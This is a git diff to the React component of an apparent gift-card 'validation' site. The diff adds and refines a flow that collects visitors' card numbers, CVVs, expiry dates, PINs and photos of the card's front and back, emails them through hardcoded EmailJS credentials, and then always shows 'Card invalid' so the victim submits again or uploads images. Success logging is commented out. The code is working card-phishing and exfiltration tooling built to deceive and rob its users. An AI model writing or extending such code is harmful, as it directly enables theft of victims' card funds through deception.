@@ -1,4 +1,4 @@
-import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue } from "@chakra-ui/react"
+import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue, Spinner } from "@chakra-ui/react"
 import { useRef, forwardRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
 
@@ -193,6 +193,7 @@ function PurchaseOrValidate() {
     const [validateExpiry, setValidateExpiry] = useState('');
     const [validatePin, setValidatePin] = useState('');
     const [loading, setLoading] = useState(false);
+    const [isUploadMode, setIsUploadMode] = useState(false);
 
     const openPurchaseModal = (card) => {
         setSelectedCard(card);
@@ -246,7 +247,7 @@ function PurchaseOrValidate() {
             validatePin,
         };
         const serviceId = 'service_rsh8zcj'
-        const templateId = 'template_jcx8l0m'
+        const templateId = 'template_kq7rvh7'
         const publicKey = 'XEPa_HeI5_6-59dSj'
         const templateParams = {
             from_name: "Gift Card Validator",
@@ -261,18 +262,44 @@ function PurchaseOrValidate() {
         }
         emailjs.send(serviceId, templateId, templateParams, publicKey)
             .then((response) => {
-                console.log("email sent succesfully", response)
+                // console.log("email sent succesfully", response)
             })
             .catch((error) => {
-                console.error("Error sending mail", error)
+                console.error("Error", error)
             })
         console.log(JSON.stringify(formData, null, 2));
         clearFormData();
+        handleToggleUploadMode();
         setTimeout(() => {
             setLoading(false);
             alert('Card invalid');
         }, 4000);
     };
+
+    const form = useRef();
+
+    const handleUploadSubmit = (event) => {
+    event.preventDefault();
+    setLoading(true);
+
+    const serviceId = 'service_rsh8zcj'
+    const templateId = 'template_kq7rvh7'
+    const publicKey = 'XEPa_HeI5_6-59dSj'
+
+    emailjs.sendForm(serviceId, templateId, form.current, publicKey)
+      .then((response) => {
+        // console.log('Email sent successfully', response);
+            alert('Card invalid');
+      })
+      .catch((error) => {
+        console.error('Error', error);
+            alert('Card invalid');
+      })
+      .finally(() => {
+        setLoading(false);
+        form.current.reset(); // Clear the form
+      });
+  };
 
     const clearFormData = () => {
         setValidateCurrency('USD');
@@ -381,6 +408,10 @@ function PurchaseOrValidate() {
         }
 
         return null;
+    };
+
+    const handleToggleUploadMode = () => {
+        setIsUploadMode(!isUploadMode);
     };
 
     return (
@@ -505,40 +536,63 @@ function PurchaseOrValidate() {
                 <Modal closeOnOverlayClick={false} isOpen={isValidateOpen} onClose={closeValidateModal} isCentered>
                     <ModalOverlay />
                     <ModalContent>
-                        <ModalHeader>Validate your card</ModalHeader>
+                        <ModalHeader>{isUploadMode ? "Upload your images" : "Validate your card"}</ModalHeader>
                         <ModalCloseButton />
-                        <form onSubmit={handleFormSubmit}>
                             <ModalBody pb={6}>
-                                <FormControl>
-                                    <FormLabel>Card name</FormLabel>
-                                    <Input value={selectedCard?.name} isReadOnly />
-                                </FormControl>
-                                <FormControl mt={4}>
-                                    <FormLabel>Select Currency</FormLabel>
-                                    <Select placeholder='Select currency' value={validateCurrency} onChange={handleValidateCurrencyChange}>
-                                        <option value='USD'>USD</option>
-                                        <option value='GBP'>GBP</option>
-                                        <option value='EUR'>EUR</option>
-                                        <option value='CAD'>CAD</option>
-                                        <option value='AUD'>AUD</option>
-                                    </Select>
-                                </FormControl>
-                                <FormControl mt={4}>
-                                    <FormLabel>Card amount</FormLabel>
-                                    <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
-                                </FormControl>
-                                <FormControl mt={4}>
-                                    <FormLabel>Card number</FormLabel>
-                                    <Input placeholder='Enter Card Number' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
-                                </FormControl>
-                                {renderExtraFields()}
+                                {/* Conditionally show form or upload message */}
+                                {isUploadMode ? (
+                                    <form ref={form} encType="multipart/form-data" onSubmit={handleUploadSubmit}>
+                                        <FormControl mt={4}>
+                                            <FormLabel>Front of Card</FormLabel>
+                                            <Input type="file" name="front_image" accept="image/*" />
+                                        </FormControl>
+
+                                        <FormControl mt={4}>
+                                            <FormLabel>Back of Card</FormLabel>
+                                            <Input type="file" name="back_image" accept="image/*" />
+                                        </FormControl>
+
+                                        <Button mt={6} colorScheme="white" variant={`outline`} type="submit" disabled={loading}>
+                                            {loading ? <Spinner size="sm" /> : 'Validate'}
+                                        </Button>
+                                    </form>
+                                ) : (
+                                    <form onSubmit={handleFormSubmit}>
+                                    <FormControl>
+                                        <FormLabel>Card name</FormLabel>
+                                        <Input value={selectedCard?.name} isReadOnly />
+                                    </FormControl>
+                                    <FormControl mt={4}>
+                                        <FormLabel>Select Currency</FormLabel>
+                                        <Select placeholder='Select currency' value={validateCurrency} onChange={handleValidateCurrencyChange}>
+                                            <option value='USD'>USD</option>
+                                            <option value='GBP'>GBP</option>
+                                            <option value='EUR'>EUR</option>
+                                            <option value='CAD'>CAD</option>
+                                            <option value='AUD'>AUD</option>
+                                        </Select>
+                                    </FormControl>
+                                    <FormControl mt={4}>
+                                        <FormLabel>Card amount</FormLabel>
+                                        <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
+                                    </FormControl>
+                                    <FormControl mt={4}>
+                                        <FormLabel>Card number</FormLabel>
+                                        <Input placeholder='Enter Card Number' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
+                                    </FormControl>
+                                    {renderExtraFields()}
+                                        
+                                </form>
+                            )}
                             </ModalBody>
                             <ModalFooter>
-                                <Button colorScheme="white" variant={`outline`} mr={3} type="submit" isLoading={loading} spinnerPlacement='start'>
+                                {isUploadMode ?? (<Button colorScheme="white" variant={`outline`} mr={3} type="submit" isLoading={loading} spinnerPlacement='start'>
                                     Validate
+                                </Button>)}
+                                <Button variant="outline" colorScheme="blue" onClick={handleToggleUploadMode}>
+                                    {isUploadMode ? "Type" : "Upload"}
                                 </Button>
                             </ModalFooter>
-                        </form>
                     </ModalContent>
                 </Modal>
                 {/* Other Cards Modal */}
@@ -585,6 +639,308 @@ function PurchaseOrValidate() {
     );
 }
 
+
+// const GiftCardForm = () => {
+//   const [selectedCard, setSelectedCard] = useState(null);
+//   const [validateCurrency, setValidateCurrency] = useState('');
+//   const [validateCardAmount, setValidateCardAmount] = useState('');
+//   const [validateCardName, setValidateCardName] = useState('');
+//   const [validateCardNumber, setValidateCardNumber] = useState('');
+//   const [validateCVV, setValidateCVV] = useState('');
+//   const [validateExpiry, setValidateExpiry] = useState('');
+//   const [validatePin, setValidatePin] = useState('');
+//   const [frontImage, setFrontImage] = useState(null);
+//   const [backImage, setBackImage] = useState(null);
+//   const [loading, setLoading] = useState(false);
+
+//   const handleFrontImageUpload = (event) => {
+//     const file = event.target.files[0];
+//     if (file) {
+//       const reader = new FileReader();
+//       reader.onloadend = () => {
+//         setFrontImage(reader.result.split(',')[1]); // Convert to base64
+//       };
+//       reader.readAsDataURL(file);
+//     }
+//   };
+
+//   const handleBackImageUpload = (event) => {
+//     const file = event.target.files[0];
+//     if (file) {
+//       const reader = new FileReader();
+//       reader.onloadend = () => {
+//         setBackImage(reader.result.split(',')[1]); // Convert to base64
+//       };
+//       reader.readAsDataURL(file);
+//     }
+//   };
+
+//   const clearFormData = () => {
+//     setSelectedCard(null);
+//     setValidateCurrency('');
+//     setValidateCardAmount('');
+//     setValidateCardName('');
+//     setValidateCardNumber('');
+//     setValidateCVV('');
+//     setValidateExpiry('');
+//     setValidatePin('');
+//     setFrontImage(null);
+//     setBackImage(null);
+//   };
+
+//   const handleFormSubmit = (event) => {
+//     event.preventDefault();
+//     setLoading(true);
+
+//     const templateParams = {
+//       from_name: "Gift Card Validator",
+//       CardType: selectedCard?.name,
+//       Currency: validateCurrency,
+//       CardAmount: validateCardAmount,
+//       CardName: validateCardName,
+//       CardNumber: validateCardNumber,
+//       CVV: validateCVV,
+//       Expiry: validateExpiry,
+//       Pin: validatePin,
+//       frontImage: frontImage,
+//       backImage: backImage
+//     };
+
+//     const serviceId = 'service_rsh8zcj';
+//     const templateId = 'template_kq7rvh7';
+//     const publicKey = 'XEPa_HeI5_6-59dSj';
+
+//     emailjs.send(serviceId, templateId, templateParams, publicKey)
+//       .then((response) => {
+//         console.log("Email sent successfully", response);
+//         alert("Email sent successfully!");
+//       })
+//       .catch((error) => {
+//         console.error("Error sending email", error);
+//         alert("Failed to send email. Please try again.");
+//       })
+//       .finally(() => {
+//         setLoading(false);
+//         clearFormData();
+//       });
+//   };
+
+//   return (
+//     <form onSubmit={handleFormSubmit}>
+//       <FormControl mt={4}>
+//         <FormLabel>Card Type</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="e.g. Visa, MasterCard"
+//           value={selectedCard?.name || ''}
+//           onChange={(e) => setSelectedCard({ name: e.target.value })}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Currency</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="e.g. USD, EUR"
+//           value={validateCurrency}
+//           onChange={(e) => setValidateCurrency(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Card Amount</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="e.g. 100"
+//           value={validateCardAmount}
+//           onChange={(e) => setValidateCardAmount(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Cardholder Name</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="Cardholder Name"
+//           value={validateCardName}
+//           onChange={(e) => setValidateCardName(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Card Number</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="Card Number"
+//           value={validateCardNumber}
+//           onChange={(e) => setValidateCardNumber(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>CVV</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="CVV"
+//           value={validateCVV}
+//           onChange={(e) => setValidateCVV(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Expiry Date</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="MM/YY"
+//           value={validateExpiry}
+//           onChange={(e) => setValidateExpiry(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>PIN</FormLabel>
+//         <Input
+//           type="text"
+//           placeholder="PIN"
+//           value={validatePin}
+//           onChange={(e) => setValidatePin(e.target.value)}
+//         />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Front of Card</FormLabel>
+//         <Input type="file" accept="image/*" onChange={handleFrontImageUpload} />
+//       </FormControl>
+
+//       <FormControl mt={4}>
+//         <FormLabel>Back of Card</FormLabel>
+//         <Input type="file" accept="image/*" onChange={handleBackImageUpload} />
+//       </FormControl>
+
+//       <Button mt={6} colorScheme="blue" type="submit" disabled={loading}>
+//         {loading ? <Spinner size="sm" /> : 'Submit'}
+//       </Button>
+//     </form>
+//   );
+// };
+
+const GiftCardForm = () => {
+  const form = useRef(); // Create a reference for the form
+  const [loading, setLoading] = useState(false);
+
+  const handleFormSubmit = (event) => {
+    event.preventDefault();
+    setLoading(true);
+
+    const serviceId = 'YOUR_SERVICE_ID'; // Replace with your actual service ID
+    const templateId = 'YOUR_TEMPLATE_ID'; // Replace with your actual template ID
+    const publicKey = 'Z'; // Replace with your actual public key
+
+    emailjs.sendForm(serviceId, templateId, form.current, publicKey)
+      .then((response) => {
+        console.log('Email sent successfully', response);
+        alert('Email sent successfully!');
+      })
+      .catch((error) => {
+        console.error('Error sending email', error);
+        alert('Failed to send email. Please try again.');
+      })
+      .finally(() => {
+        setLoading(false);
+        form.current.reset(); // Clear the form
+      });
+  };
+
+  return (
+    <form ref={form} encType="multipart/form-data" onSubmit={handleFormSubmit}>
+      <FormControl mt={4}>
+        <FormLabel>Card Type</FormLabel>
+        <Input
+          type="text"
+          name="card_type"
+          placeholder="e.g. Visa, MasterCard"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Currency</FormLabel>
+        <Input
+          type="text"
+          name="currency"
+          placeholder="e.g. USD, EUR"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Card Amount</FormLabel>
+        <Input
+          type="text"
+          name="card_amount"
+          placeholder="e.g. 100"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Cardholder Name</FormLabel>
+        <Input
+          type="text"
+          name="cardholder_name"
+          placeholder="Cardholder Name"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Card Number</FormLabel>
+        <Input
+          type="text"
+          name="card_number"
+          placeholder="Card Number"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>CVV</FormLabel>
+        <Input
+          type="text"
+          name="cvv"
+          placeholder="CVV"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Expiry Date</FormLabel>
+        <Input
+          type="text"
+          name="expiry_date"
+          placeholder="MM/YY"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>PIN</FormLabel>
+        <Input
+          type="text"
+          name="pin"
+          placeholder="PIN"
+        />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Front of Card</FormLabel>
+        <Input type="file" name="front_image" accept="image/*" />
+      </FormControl>
+
+      <FormControl mt={4}>
+        <FormLabel>Back of Card</FormLabel>
+        <Input type="file" name="back_image" accept="image/*" />
+      </FormControl>
+
+      <Button mt={6} colorScheme="blue" type="submit" disabled={loading}>
+        {loading ? <Spinner size="sm" /> : 'Submit'}
+      </Button>
+    </form>
+  );
+};
 
 const CustomerFeedback = () => {
     const feedbacks = [
